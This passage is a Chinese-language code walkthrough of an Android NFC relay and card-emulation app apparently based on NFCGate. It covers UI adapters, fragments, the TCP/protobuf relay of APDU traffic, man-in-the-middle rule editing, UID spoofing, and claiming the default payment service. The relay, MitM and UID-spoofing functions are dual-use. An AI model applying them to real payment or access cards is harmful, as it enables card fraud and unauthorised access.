(convertView == null) {\n            convertView = LayoutInflater.from(mContext).inflate(R.layout.item_hce_edittext, null);\n            holder = new ViewHolder(convertView);\n            convertView.setTag(holder);\n        } else {\n            holder = (ViewHolder) convertView.getTag();\n        }\n\n        final ItemBean itemObj = mData.get(position);\n\n        //This is important. Remove TextWatcher first.\n        if (holder.editText1.getTag() instanceof TextWatcher) {\n            holder.editText1.removeTextChangedListener((TextWatcher) holder.editText1.getTag());\n        }\n\t\t// 设置读卡器的命令\n        holder.editText1.setText(itemObj.getReader());\n        holder.bt.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                mData.remove(position);\n                if(Utils.RuleOrTable){\n                    Utils.currentRule.remove(itemObj.getReader());\n                    Utils.ruleAdapter.notifyDataSetChanged();\n                }else {\n\n                    Utils.currentMap.remove(itemObj.getReader());\n                    Utils.tableAdapter.notifyDataSetChanged();\n                }\n            }\n        });\n\n        TextWatcher watcher = new TextWatcher() {\n            @Override\n            public void beforeTextChanged(CharSequence s, int start, int count, int after) {\n                oldString=s.toString();\n            }\n\n            @Override\n            public void onTextChanged(CharSequence s, int start, int before, int count) {\n            }\n\n            @Override\n            public void afterTextChanged(Editable s) {\n                if (TextUtils.isEmpty(s)) {\n                    itemObj.setReader(\"\");\n                } else {\n                    itemObj.setReader(s.toString());\n                    if(Utils.RuleOrTable){\n                        Utils.currentRule=Utils.ChangeReader(Utils.currentRule,oldString,s.toString());\n                    }else {\n                        Utils.currentMap=Utils.ChangeReader(Utils.currentMap,oldString,s.toString());\n                    }\n                }\n            }\n        };\n\n        holder.editText1.addTextChangedListener(watcher);\n        holder.editText1.setTag(watcher);\n\n\n\n        //This is important. Remove TextWatcher first.\n        if (holder.editText2.getTag() instanceof TextWatcher) {\n            holder.editText2.removeTextChangedListener((TextWatcher) holder.editText2.getTag());\n        }\n\n        holder.editText2.setText(itemObj.getCard());\n\n        TextWatcher watcher2 = new TextWatcher() {\n            @Override\n            public void beforeTextChanged(CharSequence s, int start, int count, int after) {\n            }\n\n            @Override\n            public void onTextChanged(CharSequence s, int start, int before, int count) {\n            }\n\n            @Override\n            public void afterTextChanged(Editable s) {\n                if (TextUtils.isEmpty(s)) {\n                    itemObj.setCard(\"\");\n                } else {\n                    itemObj.setCard(s.toString());\n\n                    if(Utils.RuleOrTable){\n                        Utils.currentRule=Utils.ChangeCard(Utils.currentRule,itemObj.getReader(),s.toString());\n                    }else {\n                        Utils.currentMap=Utils.ChangeCard(Utils.currentMap,itemObj.getReader(),s.toString());\n                    }\n                }\n            }\n        };\n\n        holder.editText2.addTextChangedListener(watcher2);\n        holder.editText2.setTag(watcher2);\n        return convertView;\n    }\n```\n\n重写`getView`方法可以从视图中获取当前的ListItem, 并对ListItem进行约束. 上面代码段可看到有个一`TextWatcher`方法, 这个方法将在`CustomTextWatcher.java`详细解释.\n\n#### 2. MitmItemAdapter\n\n这应该是该项目中最复杂的`Adapter`了, 其中每个Item包含四个`Button`, 三个`TextView`, 对应每个`Button`都有对应的`OnclickListener` , 根据选中的`Button`的`id`来`switch`, 对应代码如下:\n\n```java\nView.OnClickListener mOnClickListener = new View.OnClickListener() {\n    @Override\n    public void onClick(View v) {\n        synchronized (itemDisable) {\n            synchronized (itemButtons) {\n                RuleListStorage db = new RuleListStorage(mContext);\n                List<RuleListItem> items = db.getAll();\n                switch (v.getId()) {\n                    case R.id.mitm_list_btn_exec_card:\n                        ...\n                    case R.id.mitm_list_btn_exec_reader:\n                        ...\n                    case R.id.mitm_list_btn_edit:\n                        ...\n                    case R.id.mitm_list_btn_delete:\n                        ...\n                }\n            }\n        }\n    }\n};\n```\n\n如上示代码, `v.getId`方法对应每个`Button`的id, 而四个`Button`都有对`RuleListStorage`操作, 具体SQLite的介绍在后面会详细解释. 值得注意的是, 上示代码段中引用了两个`sychronized`, 是为了各个Item在滑动过程中, 保持状态`button.setEnable(boolean)`. item的状态之所以会发生改变, 是因为adapter的缓存和预浏览机制. 具体原因请google: ArrayAdapter 滑动item状态发生改变. \n\n这里想要细讲的是关于`AlertDialog`的使用, 这里都是围绕着`etBuilder`来建立的. `AlertDialog`的作用是设置一个弹框, 然后把xml对应的组件设置进去. 如下:\n\n```java\nAlertDialog.Builder etBuilder = new AlertDialog.Builder(mContext);\nfinal View view = LayoutInflater.from(mContext).inflate(R.layout.dialog_mitm_comm_setting, null);\nfinal EditText etName = view.findViewById(R.id.mitm_setting_comm_name);\nfinal EditText etReader = view.findViewById(R.id.mitm_setting_reader_comm);\nfinal EditText etCard = view.findViewById(R.id.mitm_setting_card_comm);\netReader.addTextChangedListener(new CustomTextWatcher(etReader));\netCard.addTextChangedListener(new CustomTextWatcher(etCard));\netName.setText(mList.get(position).getName());\netReader.setText(Utils.bytesToHex(mList.get(position).getReaderComm().getData()));\netCard.setText(Utils.bytesToHex(mList.get(position).getCardComm().getData()));\netBuilder.setTitle(\"Edit Rule\")\n    .setView(view)\n    .setCancelable(true)\n    .setPositiveButton(\"Save\", new DialogInterface.OnClickListener() {\n        @Override\n        public void onClick(DialogInterface dialog, int which) {\n            // get data from user, then storage in database\n            String name = etName.getText().toString();\n            String reader = etReader.getText().toString().replace(\" \", \"\");\n            String card = etCard.getText().toString().replace(\" \", \"\");\n\n            if (name.length() == 0) {\n                Toast.makeText(mContext, \"Please input command Function!\", Toast.LENGTH_SHORT).show();\n                return;\n            } else if (!Utils.isHex(mContext, reader) && Utils.isHex(mContext, card)) {\n                return;\n            }\n\n            // save in database\n            RuleListItem ruleListItem = new RuleListItem(\n                mList.get(position).getId(),\n                name,\n                new NfcComm(NfcComm.Source.HCE, Utils.toBytes(reader)),\n                new NfcComm(NfcComm.Source.CARD, Utils.toBytes(card))\n            );\n            RuleListStorage mRuleDb = new RuleListStorage(mContext);\n            mRuleDb.update(ruleListItem);\n\n            // refreshList for list item view\n            MitmFragment.getInstance().refreshList();\n\n            notifyDataSetChanged();\n\n            // show toast\n            Toast.makeText(mContext, \"Save Successfully!\", Toast.LENGTH_SHORT).show();\n            dialog.dismiss();\n        }\n    });\netBuilder.setNegativeButton(\"Cancel\", new DialogInterface.OnClickListener() {\n    @Override\n    public void onClick(DialogInterface dialog, int which) {\n        dialog.dismiss();\n    }\n});\netBuilder.create();\netBuilder.show();\nbreak;\n```\n\n#### 3. MulAdapter\n\n这个`Adapter`比较简单, 只有`CheckBox`和`TextView`, 要注意的是, `CheckBox`在`ListView`中滑动时, 被勾选的状态也会发生改变(选中之后, 下滑返回选中状态就消失, 原因是`public View getView(int position, View convertView, ViewGroup parent)`传进来的`convertView`被多次重用), 这就需要用额外的方法保持被勾选的状态. 解决办法是用`HashMap`来保存`CheckBox`的状态值:\n\n```java\nprivate static HashMap<Integer,Boolean> isSelected = new HashMap<Integer, Boolean>();\n```\n\n如下方法是从`Fragment`中传入list之后, 根据list的状态设置`CheckBox`选中状态.可以视为初始化`CheckBox`.\n\n```java\n// MulAdapter中设置此方法.\npublic void initCheck(List<NfcComm> mlist) {\n    for (int i = 0; i < mlist.size(); i++) {\n        isSelected.put(i,mlist.get(i).isCheck());\n    }\n}\n\n// NFCComm中设置此方法.\n// checkbox getter and setter\npublic boolean isCheck() {\n    return mCheck;\n}\npublic void setCheck(boolean mCheck) {\n        this.mCheck = mCheck;\n}\n\n// LoggingFragment中 ListItem 点击事件的响应, 设置CheckBox的状态\nprotected void onListItemClick(View v, int pos, long id) {\n    // get ViewHolder Object\n    ViewHolder holder = (ViewHolder)v.getTag();\n    // change checbox status\n    holder.cb.toggle();\n    // save select state in mEvenList\n    mEventList.get(pos).setCheck(true);\n    // save checkbox selected status\n  MulAdapter.getIsSelected().put(pos,holder.cb.isChecked());\n    // adjust selected item\n    if (holder.cb.isChecked() == true) {\n        mCheckNum++;\n    } else {\n        mCheckNum--;\n    }\n    Toast.makeText(v.getContext(),\"Already selected \" + mCheckNum\n                   + \" item.\",Toast.LENGTH_SHORT).show();\n}\n```\n\n### Ⅱ. Fragment\n\n#### 1. CloneFragment\n\n这里的一些监听事件就不细讲, 挑一些重要的讲一下. \n\n`Fragment`与`Activity`是相辅相成的, 一个`Activity`可以有多个`Fragment`, 例如, 该项目中的`MainActivity`中调用了多个`Fragment`(具体调用及原理参阅<安卓编程权威指南>第10章), 而`Fragment`被调用的方式如下: \n\n```java\n// CloneFragment的一个方法, 这个方法被其他class调用, 从而调用该Fragment\npublic static CloneFragment getInstance() {\n    if(mFragment == null) {\n        mFragment = new CloneFragment();\n    }\n    return mFragment;\n}\nRelayFragment.getInstance();RelayFragment.getInstance();\n```\n\n其中, 发现标签后, 会做如下写数据库操作:\n\n```java\nCloneListStorage storage = new CloneListStorage(mContext);\n                            storage.add(new CloneListItem(RelayFragment.getInstance().mNfcManager.getAnticolData(), value.toString()));\n```\n\n这里从`RelayFragment`中获取实例后, 再调用该实例里的`mNfcManager`实例的方法获得卡的UID. 随机UID的方法在接下来数据库操作那里解释.\n\n#### 2. EnablenfcDialog\n\n这个`Dialog`在NFC没开启的情况下, 会跳出该`Dialog`, 提示去系统设置里打开NFC.\n\n```java\n// 在MainActivity中, 继承了EnableNFCDialog, 因此重载了该方法, 并调用了Settings\n@Override\n    public void onNFCDialogPositiveClick() {\n        // User touched the dialog's goto settings button\n        Intent intent = new Intent(Settings.ACTION_NFC_SETTINGS);\n        startActivity(intent);\n    }\n```\n\n#### 4. HceFragment\n\n这个`Fragment`是第四个Tab, 也就是`Hce`下的视图界面代码, 值得关注的几点有:\n\n- 动态申请存储权限\n\n  ```java\n  // ActivityCompat.requestPermissions的方法能够调用申请的dialog\n  if (Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP) {\n      if (ActivityCompat.checkSelfPermission(getContext(), Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {\n          ActivityCompat.requestPermissions(getActivity(), PERMISSIONS_STORAGE, REQUEST_PERMISSION_CODE);\n      }\n  }\n  ```\n\n- 动态申请默认支付权限\n\n  ```java\n  NfcAdapter adapter = NfcAdapter.getDefaultAdapter(getContext());\n  // 通过上面实例化一个NFCAdapter之后, 成功获取了CardEmulation实例\n  mCardEmulation = CardEmulation.getInstance(adapter);\n  // ComponentName输入的是对应的包名和类\n  ComponentName myComponent = new ComponentName(\"tud.seemuh.nfcgate\",\"tud.seemuh.nfcgate.nfc.hce.ApduService\");\n  // 调用CardEmulation的方法\n  if (!mCardEmulation.isDefaultServiceForCategory(myComponent, CardEmulation.CATEGORY_PAYMENT)) {\n      Intent intent = new Intent(CardEmulation.ACTION_CHANGE_DEFAULT);\n      intent.putExtra(CardEmulation.EXTRA_CATEGORY, CardEmulation.CATEGORY_PAYMENT);\n      intent.putExtra(CardEmulation.EXTRA_SERVICE_COMPONENT, myComponent);\n      startActivityForResult(intent, 0);\n  } else {\n      Log.e(\"MainActivityHost\", \"on Create: Already default!\");\n  }\n  ```\n\n- 设置Spinner控件的Adapter\n\n  ```java\n  ArrayAdapter<String> listadapter = new ArrayAdapter<String>(getContext(), android.R.layout.simple_spinner_dropdown_item,myFile);\n  sp.setAdapter(listadapter);\n  ```\n\n#### 5. LoggingDetailFragment\n\n这个`Fragment`是布局Logging数据的视图, 算是一个比较复杂的`Fragment`了, 将会对如下特性作解释.\n\n- AlertDialog\n\n  ```java\n  private AlertDialog getRenameSessionDialog() {\n      AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());\n      // Add input value 给TextView添加原本来的Session\n      final EditText input = new EditText(getActivity());\n      if (mSession.getName() != null) {\n          input.setText(mSession.getName());\n      }\n  \n      // Set up text\n      builder.setTitle(getText(R.string.title_dialog_rename))\n          .setMessage(getText(R.string.rename_dialog_text))\n          .setView(input)\n          .setIcon(R.drawable.ic_action_edit_title)\n          .setPositiveButton(getString(R.string.rename_dialog_confirm), new DialogInterface.OnClickListener() {\n              @Override\n              public void onClick(DialogInterface dialogInterface, int i) {\n                  doSessionRename(input.getText().toString());\n              }\n          });\n  \n      builder.setNegativeButton(getString(R.string.rename_dialog_cancel), this);\n  \n      return builder.create();\n  }\n  ```\n\n  这算是一个比较经典的关于弹窗的案例了, `AlertDialog.Builder`实例化的对象有多种设置组件的方法, 如上面代码所示, 最后调用`getRenameSessionDialog.show()`即可弹窗.\n\n- AsyncTask\n\n  ```java\n  private class AsyncSessionLoader extends AsyncTask<Long, Void, Cursor> {\n      private final String TAG = \"AsyncSessionLoader\";\n  \n      private SQLiteDatabase mDB;\n  \n      // 重写此方法以在后台线程上执行计算\n      @Override\n      protected Cursor doInBackground(Long... longs) {\n          Log.d(TAG, \"doInBackground: Started\");\n          // Get a DB object\n          SessionLoggingDbHelper dbHelper = new SessionLoggingDbHelper(getActivity());\n          mDB = dbHelper.getReadableDatabase();\n  \n          // Construct query\n          // Define Projection\n          String[] projection = {\n              SessionLoggingContract.SessionMeta._ID,\n              SessionLoggingContract.SessionMeta.COLUMN_NAME_NAME,\n              SessionLoggingContract.SessionMeta.COLUMN_NAME_DATE,\n          };\n          // Define Sort order\n          String sortorder = SessionLoggingContract.SessionMeta.COLUMN_NAME_DATE + \" DESC\";\n          // Define Selection\n          String selection = SessionLoggingContract.SessionMeta._ID + \" LIKE ?\";\n          // Define Selection Arguments\n          String[] selectionArgs = {String.valueOf(longs[0])};\n  \n          // Perform query\n          Log.d(TAG, \"doInBackground: Performing query\");\n          Cursor c = mDB.query(\n              SessionLoggingContract.SessionMeta.TABLE_NAME,  // Target Table\n              projection,    // Which fields are we interested in?\n              selection,     // Selection clause\n              selectionArgs, // Arguments to clause\n              null,          // Grouping (not desired in this case)\n              null,          // Filtering (not desired in this case)\n              sortorder      // Sort order\n          );\n  \n          Log.d(TAG, \"doInBackground: Query done, returning\");\n          return c;\n  \t}\n      \n      // 必须从应用程序的主线程调用此方法, 上面方法返回的cursor传入下面的方法\n      @Override\n      protected void onPostExecute(Cursor c) {\n          // Move to the first element of the cursor\n          Log.d(TAG, \"onPostExecute: Beginning processing of Sessions\");\n          if (!c.moveToFirst()) {\n              Log.i(TAG, \"onPostExecute: Cursor empty, doing nothing.\");\n              return;\n          }\n  \n          // prepare session object\n          long ID = c.getLong(c.getColumnIndexOrThrow(SessionLoggingContract.SessionMeta._ID));\n          String name = c.getString(c.getColumnIndexOrThrow(SessionLoggingContract.\n                                                            SessionMeta.COLUMN_NAME_NAME));\n          String date = c.getString(c.getColumnIndexOrThrow(SessionLoggingContract.\n                                                            SessionMeta.COLUMN_NAME_DATE));\n          NfcSession session = new NfcSession(date, ID, name);\n  \n          // Update session information\n          setSessionDetails(session);\n          Log.d(TAG, \"onPostExecute: Closing connection and finishing\");\n          c.close();\n          mDB.close();\n      }\n  }\n  ```\n\n  这里用了UI多线程[AsyncTask](https://developer.android.com/reference/android/os/AsyncTask)的方式从数据库中加载Session的Apdu数据. \n\n#### 6. LoggingFragment\n\n这里的特性跟`loggingDetailFragment`的差不多, 是Session列表的视图界面, 具体分析不再展开.\n\n#### 7. MitmFragment\n\n在RelayFragment中可以跳到这个Fragment, 这里主要的操作也是数据库操作. 如下:\n\n```java\n// get data from user, then storage in database\n// 这里需要注意的是, 因为调用了CustomTextWatcher, 每一个字节16进制字符串会有一个空格, 因此入库的时候要把空格删掉\nString name = etName.getText().toString();\nString reader = etReader.getText().toString().replace(\" \",\"\");\nString card = etCard.getText().toString().replace(\" \",\"\");\n\n// check input hex format\nif (name.length() == 0) {\n    Toast.makeText(getActivity(),\"Please input command Function!\",Toast.LENGTH_SHORT).show();\n    return;\n} else if (!Utils.isHex(mContext, reader) && Utils.isHex(mContext, card)) {\n    return;\n}\n\n// save in database\nRuleListItem ruleListItem = new RuleListItem(\n    name,\n    new NfcComm(NfcComm.Source.HCE,Utils.toBytes(reader)),\n    new NfcComm(NfcComm.Source.CARD,Utils.toBytes(card))\n);\nRuleListStorage mRuleDb = new RuleListStorage(mContext);\nmRuleDb.add(ruleListItem);\n\n// add item list\nrefreshList();\n\nmListAdapter.notifyDataSetChanged();\n// success message show in activity\nToast.makeText(getActivity(),\"Save Successfully!\",Toast.LENGTH_SHORT).show();\ndialog.dismiss();\n```\n\n#### 8. RelayFragment\n\n这个Fragment应该是最重要的一个了. 一开始先实例化诸多空间和诸多类, 控制Nerwork/NFC/Database等. 下面将一些方法实现.\n\n1. checkIpPort\n\n   ```java\n   // regex for IP checking\n   private static final String regexIPpattern =\"^(([01]?\\\\d\\\\d?|2[0-4]\\\\d|25[0-5])\\\\.){3}([01]?\\\\d\\\\d?|2[0-4]\\\\d|25[0-5])$\";\n   private static int maxPort = 65535;\n   ．．．\n   // 这个方法是检测IP和port的\n   public boolean checkIpPort(String ip, String port) {\n       boolean validPort = false;\n       boolean gotException = false;\n       boolean validIp = false;\n       // 实例化matcher以便根据正则确定是否是合法的IP\n       Pattern pattern = Pattern.compile(regexIPpattern);\n       Matcher matcher = pattern.matcher(ip);\n       \n       int int_port = 0;\n       try {\n           int_port = Integer.parseInt(port.trim());\n       } catch (NumberFormatException e) {\n           gotException = true;\n       }\n       if (!gotException) {\n       // 若在端口范围内, 则validPort置为true\n           if ((int_port > 0) && (int_port <= maxPort)) validPort = true;\n       }\n       validIp = matcher.matches();\n       if (validPort) globalPort = int_port;\n       // 只有port和ip都合法时才返回true\n       return validPort && validIp;\n   }\n   ```\n\n2. defineUID\n\n   ```java\n   mFilterManager.rule.setAc(RuleMatching.MitMAction.SelfDefineAnticol);\n   final AlertDialog.Builder builder = new AlertDialog.Builder(getContext());\n   final EditText input = new EditText(getContext());\n   input.addTextChangedListener(new CustomTextWatcher(input));\n   builder.setTitle(R.string.pref_define_uid_title)\n       .setCancelable(true)\n       .setMessage(R.string.pref_define_uid_hex)\n       .setView(input)\n       .setPositiveButton(\"Confirm\", new DialogInterface.OnClickListener() {\n           @Override\n           public void onClick(DialogInterface dialog, int which) {\n               String UID = input.getText().toString().replace(\" \",\"\");\n               // 检查UID的长度是不是4个字节\n               if(!Utils.isHexAndByte(UID, getContext(),4)){\n                   return;\n               }\n               // 如果检查通过则调用Filtermanager里实例化的Rule, 这里对应的是RuleMatching\n               mFilterManager.rule.setUID(UID);\n           }\n       })\n       .setNegativeButton(\"Cancel\", new DialogInterface.OnClickListener() {\n           @Override\n           public void onClick(DialogInterface dialog, int which) {\n               return;\n           }\n       });\n   builder.create();\n   builder.show();\n   break;\n   ```\n\n   关于defineUID的有三种UID模式, 分别是: `RandomUID` `SelfDefineUID` `DefultUID`, 分别对应三个case, 上示代码是关于`selfdefineUID`的代码. \n\n3. networkConnectCommon\n\n   ```java\n   private void networkConnectCommon() {\n       // Initialize SinkManager\n       mSinkManager = new SinkManager(mSinkManagerQueue);\n   \n       // Initialize FilterManager\n       mFilterManager = new FilterManager();\n   \n       // Pass references\n       // 用来存储Apdu数据\n       mNfcManager.setSinkManager(mSinkManager, mSinkManagerQueue);\n       // 用来过滤Apdu数据\n       mNfcManager.setFilterManager(mFilterManager);\n       // 用来HighLevelProtobufHandler\n       mNfcManager.setNetworkHandler(mConnectionClient);\n   \n       // FIXME For debugging purposes, hardcoded selecting of sinks happens here\n       // This should be selectable by the user\n   \n       // Initialize sinks\n       // Get Preference manager to determine which sinks are active\n       SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(getActivity());\n   \n       // Determine settings for sinks\n       boolean textViewSinkActive   = prefs.getBoolean(getString(R.string.pref_key_debugWindow), false);\n       boolean logfileSinkActive    = prefs.getBoolean(getString(R.string.pref_key_logfile), false);\n       boolean logSessionSinkActive = prefs.getBoolean(getString(R.string.pref_key_sessionlogging), false);\n   \n      // try...catch...排错, 存储network中的Apdu\n       try {\n           if (textViewSinkActive) {\n               // Debug window is active, activate the sink that collects data for it\n               mSinkManager.addSink(SinkManager.SinkType.DISPLAY_TEXTVIEW, mDebuginfo, false);\n           }\n           if (logfileSinkActive) {\n               // Logging to file is active. Generate filename from timestamp\n               SimpleDateFormat sdfDate = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\", Locale.US);\n               Date now = new Date();\n               String strDate = sdfDate.format(now);\n   \n               // Initialize File Sink 保存txt log到存储空间\n               mSinkManager.addSink(SinkManager.SinkType.FILE, strDate + \".txt\");\n           }\n           if (logSessionSinkActive) {\n               mSinkManager.addSink(SinkManager.SinkType.SESSION_LOG, getActivity());\n           }\n       } catch (SinkInitException e) {\n           e.printStackTrace();\n       }\n       // TODO Initialize and add Filters\n       // Do the actual network connection\n       mConnectionClient.connect(mIP.getText().toString(), port);\n   }\n   ```\n\n### Ⅲ. tabLayout & tabLogic\n\n#### PagerAdapter\n\n如果还需要在`MainActivity`中添加`Fragment`视图, 可以直接在这个类里添加就好, 修改的地方有三点:\n\n```java\n// 每增加一个Fragment, return的值就+1\n@Override\npublic int getCount() {\n    return 4;\n}\n\n// 每增加一个Fragment, 就在对应的position返回对应的名称, 以设置名称的值\n@Override\npublic CharSequence getPageTitle(int position) {\n    if (position == 0) {\n        return \"Relay\";\n    } else if (position == 1) {\n        return \"Clone\";\n    } else if (position == 2) {\n        return \"Log\";\n    } else if (position == 3) {\n        return \"HCE\";\n    } else {\n        return \"Item \" + (position + 1);\n    }\n}\n\n// 每增加一个Fragment, 就根据pos的位置return一个instance.\n@Override\npublic Fragment getItem(int pos) {\n    switch (pos) {\n        case 0:\n            return RelayFragment.getInstance();\n        case 1:\n            return CloneFragment.getInstance();\n        case 2:\n            return LoggingFragment.getInstance();\n        case 3:\n            return HceFragment.getInstance();\n        default:\n            return RelayFragment.getInstance();\n    }\n}\n```\n\n### Ⅳ. Activity\n\n#### 1. AboutWorkaroundActivity\n\n```java\nmWebView = (WebView) findViewById(R.id.workaroundDescWebView);\n// Returns the language code of this Locale.\nString loc = Locale.getDefault().getLanguage();\n// 检索这些资源的底层 AssetManager 存储.\nAssetManager mg = getResources().getAssets();\nString path = \"html/desfire-info.\" + loc + \".html\";\ntry {\n    mg.open(path);\n    Log.i(TAG, \"HTML exists for locale \" + loc + \", using it.\");\n    // mWebView实例加载了该目录下的html\n    mWebView.loadUrl(\"file:///android_asset/\" + path);\n} catch (IOException ex) {\n    Log.i(TAG, \"No HTML for locale \" + loc + \", using default (en)\");\n    mWebView.loadUrl(\"file:///android_asset/html/desfire-info.en.html\");\n}\n```\n\n#### 2. EditActivity\n\n```java\n// 这个Activity主要是在HCE模式下, 用来编辑数据的.\n// 从资源中, 获取对应txt的map并放到TextView\nMap<String,String> myMap= Utils.currentMap;\nfor(Map.Entry<String,String> entry:myMap.entrySet()){\n    mData.add(new ItemBean(entry.getKey(),entry.getValue()));\n}\n// 给mData listview设置Adapter\nmAdapter = new ListViewAdapter(this, mData);\nUtils.tableAdapter = mAdapter;\nmListView.setAdapter(mAdapter);\n\n//添加控件的监听事件\nmButton.setOnClickListener(new View.OnClickListener() {\n    @Override\n    public void onClick(View view) {\n        mData.add(new ItemBean());\n        mAdapter.notifyDataSetChanged();\n    }\n});\n```\n\n#### 3. LogActivity\n\n这个Activity用在HCE模式中查看Log的视图界面, 内容较简单, 不再细讲.\n\n#### 4. MainActivity\n\n这个Activity是控制整个project的枢纽.\n\n```java\n// 这里初始化hce hook action\nDaemonConfiguration.Init(this);\n// 这里注册接收器\nregisterReceiver(new BroadcastReceiver() {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        Toast.makeText(context, intent.getStringExtra(\"text\"), Toast.LENGTH_LONG).show();\n    }\n}, new IntentFilter(\"tud.seemuh.nfcgate.toaster\"));\n```\n\n#### 5. SettingActivity\n\n这个Activity是`设置`界面的Activity, \n\n## 0x02 network模块\n\n### Ⅰ. c2c/c2s/meta\n\n这三个是根据protobuf序列化之后的类, 不用改, 直接调用就好.\n\n### Ⅱ. HighLevelProtobufHandler\n\n`HightLevelProtobufhandler`是``HighLevelNetworkHandler`接口的实现。它用于控制所有的网络通信，并使用一个低级别的网络处理程序来进行实际的网络通信。在这个处理程序和各自的回调实现（在我们的例子中是`ProtobufCallBack`）中，协议本身被实现。`HightLevelProtobufhandler`保持网络连接的状态，并负责在连接断开连接时拆卸所有相关的线程，由用户请求或一般连接丢失负责。\n\n```java\n// 动态修改Button\nprivate void reactivateButtons() {\n    // We need to pass a parameter, even though it isn't used. Otherwise, the app will crash.\n    new UpdateUI(connectButton, UpdateUI.UpdateMethod.enableButton).execute(\"Unfug\");\n    new UpdateUI(joinButton, UpdateUI.UpdateMethod.enableButton).execute(\"Unfug\");\n    new UpdateUI(abortButton, UpdateUI.UpdateMethod.disableButton).execute(\"Unfug\");\n}\n\nprivate void setButtonTexts() {\n    new UpdateUI(connectButton, UpdateUI.UpdateMethod.setTextButton).execute(MainActivity.createSessionMessage);\n    new UpdateUI(joinButton, UpdateUI.UpdateMethod.setTextButton).execute(MainActivity.joinSessionMessage);\n    new UpdateUI(resetButton, UpdateUI.UpdateMethod.setTextButton).execute(MainActivity.resetMessage);\n}\n```\n\n接下来是三个比较重要的函数:\n\n```java\n// for reader\n@Override\npublic void sendAPDUMessage(NfcComm nfcdata) {\n    // 检测是否是apdu数据\n    if (nfcdata.getType() != NfcComm.Type.NFCBytes) {\n        Log.e(TAG, \"sendApduMessage: NfcComm object does not contain NFC bytes. Doing nothing.\");\n        return;\n    }\n    // 若reader mode关闭了, 则返回\n    if (status != Status.PARTNER_READER_MODE) {\n        Log.e(TAG, \"sendAPDUMessage: Trying to send APDU message to partner who is not in reader mode. Doing nothing.\");\n        return;\n    }\n    byte[] apdu = nfcdata.getData();\n    \n    // Prepare message\n    C2C.NFCData.Builder apduMessage = C2C.NFCData.newBuilder();\n    // 给apduMessage 设置READER属性\n    apduMessage.setDataSource(C2C.NFCData.DataSource.READER);\n    apduMessage.setDataBytes(ByteString.copyFrom(apdu));\n\n    // Send prepared message\n    sendMessage(apduMessage.build(), MessageCase.NFCDATA);\n}\n\n// for card\n@Override\npublic void sendAPDUReply(NfcComm nfcdata) {\n    if (nfcdata.getType() != NfcComm.Type.NFCBytes) {\n        Log.e(TAG, \"sendApduReply: NfcComm object does not contain NFC bytes. Doing nothing.\");\n        return;\n    }\n    if (status != Status.PARTNER_APDU_MODE) {\n        Log.e(TAG, \"sendAPDUReply: Trying to send APDU reply to partner who is not in APDU mode. Doing nothing.\");\n        return;\n    }\n    byte[] nfcbytes = nfcdata.getData();\n\n    // Build reply Protobuf\n    C2C.NFCData.Builder reply = C2C.NFCData.newBuilder();\n    reply.setDataBytes(ByteString.copyFrom(nfcbytes));\n    // 设置CARD属性\n    reply.setDataSource(C2C.NFCData.DataSource.CARD);\n\n    // Send reply\n    sendMessage(reply.build(), MessageCase.NFCDATA);\n}\n\n// it's about uid\n@Override\npublic void sendAnticol(NfcComm nfcdata) {\n    if (nfcdata.getType() != NfcComm.Type.AnticolBytes) {\n        Log.e(TAG, \"sendAnticol: NfcComm object does not contain Anticol bytes. Doing nothing.\");\n        return;\n    }\n\n    // Retrieve values\n    byte[] config = nfcdata.getConfig().build();\n\n    // Build reply protobuf\n    C2C.Anticol.Builder b = C2C.Anticol.newBuilder();\n    b.setCONFIG(ByteString.copyFrom(config));\n\n    // TODO If we aren't in a session, cache this and send it as soon as a session is established?\n    // (And delete it if the card is removed in the meantime)\n    sendMessage(b.build(), MessageCase.ANTICOL);\n    Log.d(TAG, \"sendAnticol: Sent Anticol message\");\n}\n```\n\n### Ⅲ. LowLevelTCPHandler\n\n该类只发送和接收原始字节，所有的协议逻辑和解析分别发生在HighLevelNetworkHandler或回调实例中。原始数据按照4字节的长度发送数据, 并且通过socket把所有的数据都发送出去.  `BufferedInputStream`为另一个输入流添加功能 - 即缓冲输入和支持mark和reset 方法的能力。当`BufferedInputStream` 创建时，会创建一个内部缓冲区数组。当流中的字节被读取或跳过时，内部缓冲区将根据需要从所包含的输入流中重新填充，一次处理多个字节。该mark 操作会记住输入流中的一个点，并且该reset操作会导致自从最近mark操作以来，在从所包含的输入流中获取新字节之前重新读取所有字节。\n\n```java\nbyte[] lenbytes = new byte[4];\nint rcvlen = dis.read(lenbytes);\nLog.d(TAG, \"Got \" + rcvlen + \" bytes\");\nint len = ByteBuffer.wrap(lenbytes).getInt();\n\n// read the message data\nif (len > 0) {\n    Log.i(TAG, \"Reading bytes of length:\" + len);\n    readBytes = new byte[len];\n    int read = 0;\n    do {\n        // read(byte[] b, int off, int len)\n        // 将该字节输入流中的字节读入指定的字节数组，从给定的偏移量开始。\n        read += dis.read(readBytes, read, len-read);\n    } while(read < len);\n\n    Log.d(TAG, \"Read data: \" + Utils.bytesToHex(readBytes));\n    if(mCallback != null) {\n        Log.d(TAG, \"Delegating to Callback.\");\n        Log.i(\"readBytes: \", Utils.bytesToHex(readBytes));\n        mCallback.onDataReceived(readBytes);\n        Log.d(TAG, \"Callback finished execution.\");\n    }\n    else {\n        Log.i(TAG, \"No callback set, saving for later\");\n        getSome = true;\n    }\n} else {\n    Log.e(TAG, \"Error no postive number of bytes: \" + len);\n    throw new IOException(\"Protocol error: Length information was negative or null\");\n}\n```\n\n### Ⅳ. ProtobufCallback\n\n这个类里面包含卡和读卡器所有的数据流, 其中最为重要的是`handleWrapperMessage`这个函数, 如下:\n\n```java\nprivate void handleWrapperMessage(MetaMessage.Wrapper Wrapper) {\n    // Determine which type of Message the MetaMessage contains\n    if (Wrapper.getMessageCase() == MessageCase.DATA) {\n        Log.i(TAG, \"onDataReceived: MessageCase.DATA: Sending to handler\");\n        handleData(Wrapper.getData());\n    }\n    else if (Wrapper.getMessageCase() == MessageCase.NFCDATA) {\n        Log.i(TAG, \"onDataReceived: MessageCase:NFCDATA: Sending to handler\");\n        handleNFCData(Wrapper.getNFCData());\n    }\n    else if (Wrapper.getMessageCase() == MessageCase.SESSION) {\n        Log.i(TAG, \"onDataReceived: MessageCase.SESSION: Sending to handler\");\n        